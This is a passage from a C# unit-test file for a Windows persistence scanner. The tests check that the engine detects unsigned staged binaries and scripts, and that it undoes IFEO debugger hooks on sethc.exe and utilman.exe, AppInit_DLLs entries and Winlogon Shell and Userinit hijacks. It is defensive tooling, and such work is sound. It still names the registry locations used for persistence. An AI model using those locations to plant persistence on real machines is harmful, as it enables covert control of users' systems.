            _mockRegistry.Verify(r => r.DeleteValue(RegistryHive.LocalMachine, RegistryView.Registry32, @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe", "Debugger"), Times.Once);
        }

        [Fact]
        public async Task RemediateEntryAsync_AppInit_ClearsDllsAndDisablesLoadAppInit()
        {
            // Arrange
            var entry = new PersistenceEntry
            {
                Id = "appinit_test",
                Category = "DLL Injection",
                Name = "AppInit_DLLs Active",
                TargetType = "AppInit"
            };

            var engine = CreateEngine();

            // Act
            var result = await engine.RemediateEntryAsync(entry);

            // Assert
            Assert.True(result.Success);
            string winPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows";
            _mockRegistry.Verify(r => r.SetString(RegistryHive.LocalMachine, RegistryView.Registry64, winPath, "AppInit_DLLs", ""), Times.Once);
            _mockRegistry.Verify(r => r.SetDword(RegistryHive.LocalMachine, RegistryView.Registry64, winPath, "LoadAppInit_DLLs", 0), Times.Once);
        }

        [Fact]
        public async Task RemediateEntryAsync_Winlogon_ResetsShellAndUserinitToDefaults()
        {
            // Arrange
            var entry = new PersistenceEntry
            {
                Id = "winlogon_shell",
                Category = "Winlogon Hijack",
                Name = "Non-standard Winlogon Shell",
                TargetType = "Winlogon"
            };

            var engine = CreateEngine();

            // Act
            var result = await engine.RemediateEntryAsync(entry);

            // Assert
            Assert.True(result.Success);
            string winlogonPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
            _mockRegistry.Verify(r => r.SetString(RegistryHive.LocalMachine, RegistryView.Registry64, winlogonPath, "Shell", "explorer.exe"), Times.Once);
            _mockRegistry.Verify(r => r.SetString(RegistryHive.LocalMachine, RegistryView.Registry64, winlogonPath, "Userinit", @"C:\Windows\system32\userinit.exe,"), Times.Once);
        }

        #endregion

        #region Vector 4: Temp, AppData, ProgramData Unsigned Binaries & Signatures

        [Fact]
        public async Task ScanAsync_DetectsUnsignedRunningProcess_InStagingDirectory()
        {
            // Arrange
            string tempExe = @"C:\Users\Admin\AppData\Local\Temp\dropper.exe";
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>
            {
                new() { ProcessId = 1337, ProcessName = "dropper", ExecutablePath = tempExe }
            });

            _mockSigValidator.Setup(v => v.ValidateSignature(tempExe))
                .Returns(SignatureValidationResult.Unsigned());

            _mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            _mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            _mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            _mockRegistry.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            var threat = Assert.Single(report.Threats, t => t.Category == "Suspicious Running Binary");
            Assert.Equal(ThreatSeverity.Critical, threat.Severity);
            Assert.Contains("dropper", threat.Name);
            Assert.Equal(tempExe, threat.Location);
        }

        [Fact]
        public async Task ScanAsync_IgnoresValidlySignedBinary_InStagingDirectory()
        {
            // Arrange
            string tempExe = @"C:\Users\Admin\AppData\Local\Temp\installer.exe";
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>
            {
                new() { ProcessId = 2000, ProcessName = "installer", ExecutablePath = tempExe }
            });

            _mockSigValidator.Setup(v => v.ValidateSignature(tempExe))
                .Returns(SignatureValidationResult.Valid("Microsoft Corporation", "Microsoft Root CA", DateTime.Now.AddYears(1)));

            _mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            _mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            _mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            _mockRegistry.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            Assert.Empty(report.Threats.Where(t => t.Category == "Suspicious Running Binary"));
        }

        [Fact]
        public async Task ScanAsync_DetectsStagedScriptsAndUnsignedBinaries()
        {
            // Arrange
            string tempDir = Path.GetTempPath();
            _mockFileSystem.Setup(f => f.DirectoryExists(It.IsAny<string>())).Returns(true);
            _mockFileSystem.Setup(f => f.GetFiles(tempDir, "*.ps1", SearchOption.TopDirectoryOnly))
                .Returns(new[] { Path.Combine(tempDir, "backdoor.ps1") });
            _mockFileSystem.Setup(f => f.GetFiles(tempDir, "*.exe", SearchOption.TopDirectoryOnly))
                .Returns(new[] { Path.Combine(tempDir, "unsigned_loader.exe") });
            _mockFileSystem.Setup(f => f.GetFileLength(It.IsAny<string>())).Returns(10240);

            _mockSigValidator.Setup(v => v.ValidateSignature(Path.Combine(tempDir, "unsigned_loader.exe")))
                .Returns(SignatureValidationResult.Unsigned());

            _mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            _mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            _mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            _mockRegistry.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            Assert.Contains(report.Threats, t => t.Category == "Staged Script Payload" && t.Name == "backdoor.ps1");
            Assert.Contains(report.Threats, t => t.Category == "Unsigned Staged Binary" && t.Name == "unsigned_loader.exe");
        }

        [Fact]
        public async Task ScanAsync_DetectsSelfSignedAndExpiredBinaries()
        {
            // Arrange
            string tempDir = Path.GetTempPath();
            string selfSignedExe = Path.Combine(tempDir, "self_signed.exe");
            _mockFileSystem.Setup(f => f.DirectoryExists(It.IsAny<string>())).Returns(true);
            _mockFileSystem.Setup(f => f.GetFiles(tempDir, "*.exe", SearchOption.TopDirectoryOnly))
                .Returns(new[] { selfSignedExe });
            _mockFileSystem.Setup(f => f.GetFileLength(selfSignedExe)).Returns(4096);

            _mockSigValidator.Setup(v => v.ValidateSignature(selfSignedExe))
                .Returns(SignatureValidationResult.Invalid("Self-signed certificate.", selfSigned: true, signer: "Untrusted Developer"));

            _mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            _mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            _mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            _mockRegistry.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            var threat = Assert.Single(report.Threats, t => t.Name == "self_signed.exe");
            Assert.Equal(ThreatSeverity.High, threat.Severity);
            Assert.Contains("Self-signed", threat.Description);
        }

        [Fact]
        public async Task RemediateEntryAsync_StagedFile_DeletesPayloadFile()
        {
            // Arrange
            string filePath = @"C:\Users\Admin\AppData\Local\Temp\malicious.exe";
            var entry = new PersistenceEntry
            {
                Id = "file_temp",
                Category = "Unsigned Staged Binary",
                Name = "malicious.exe",
                Location = filePath,
                TargetType = "File",
                AdditionalData = filePath
            };

            _mockFileSystem.Setup(f => f.FileExists(filePath)).Returns(true);

            var engine = CreateEngine();

            // Act
            var result = await engine.RemediateEntryAsync(entry);

            // Assert
            Assert.True(result.Success);
            _mockFileSystem.Verify(f => f.DeleteFile(filePath), Times.Once);
        }

        [Fact]
        public async Task RemediateEntryAsync_StagedFile_ReturnsFailIfFileNotFound()
        {
            // Arrange
            string filePath = @"C:\Users\Admin\AppData\Local\Temp\missing.exe";
            var entry = new PersistenceEntry
            {
                Id = "file_temp_missing",
                Category = "Unsigned Staged Binary",
                Name = "missing.exe",
                Location = filePath,
                TargetType = "File",
                AdditionalData = filePath
            };

            _mockFileSystem.Setup(f => f.FileExists(filePath)).Returns(false);

            var engine = CreateEngine();

            // Act
            var result = await engine.RemediateEntryAsync(entry);

            // Assert
            Assert.False(result.Success);
            Assert.Contains("File does not exist", result.Message);
        }

        #endregion

        #region Remediation & General Tests

        [Fact]
        public async Task RemediateEntryAsync_NonElevated_ReturnsRequiresElevationTrue()
        {
            // Arrange
            var entry = new PersistenceEntry
            {
                Id = "ifeo_access_denied",
                Category = "IFEO Hijack",
                Name = "Debugger Hook on sethc.exe",
                TargetType = "IFEO",
                AdditionalData = "sethc.exe|Registry64"
            };

            _mockRegistry.Setup(r => r.DeleteValue(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>(), It.IsAny<string>()))
                .Throws(new UnauthorizedAccessException("Access to registry key is denied."));

            var engine = CreateEngine();

            // Act
            var result = await engine.RemediateEntryAsync(entry);

            // Assert
            Assert.False(result.Success);
            Assert.True(result.RequiresElevation);
            Assert.Contains("Administrative elevation required", result.Message);
        }

        [Fact]
        public async Task RemediateAllAsync_ProcessesBatchThreatsCorrectly()
        {
            // Arrange
            var threats = new List<PersistenceThreatItem>
            {
                new()
                {
                    Id = "t1",
                    Category = "WMI Persistence",
                    Name = "WMI Consumer: BadWmi",
                    TargetType = "WMI",
                    AdditionalData = "BadWmi|BadFilter"
                },
                new()
                {
                    Id = "t2",
                    Category = "IFEO Hijack",
                    Name = "Debugger Hook on utilman.exe",
                    TargetType = "IFEO",
                    AdditionalData = "utilman.exe|Registry64"
                }
            };

            var engine = CreateEngine();

            // Act
            var results = await engine.RemediateAllAsync(threats);

            // Assert
            Assert.Equal(2, results.Count);
            Assert.All(results, r => Assert.True(r.Success));
        }

        [Fact]
        public async Task RemediateEntryAsync_NonRemediableEntry_ReturnsFail()
        {
            // Arrange
            var entry = new PersistenceEntry
            {
                Id = "non_remediable",
                Category = "Custom Item",
                Name = "Locked Persistence",
                CanRemediate = false
            };

            var engine = CreateEngine();

            // Act
            var result = await engine.RemediateEntryAsync(entry);

            // Assert
            Assert.False(result.Success);
            Assert.Contains("marked as non-remediable", result.Message);
        }

        [Fact]
        public async Task ScanAsync_LiveHost_CompletesWithoutExceptions()
        {
            // Integration smoke test using default live Windows providers
            var engine = new PersistenceScannerEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            Assert.NotNull(report);
            Assert.NotNull(report.Threats);
            Assert.True(report.TotalItemsScanned >= 0);
            Assert.True(report.ThreatCount >= 0);
        }

        #endregion
    }
}
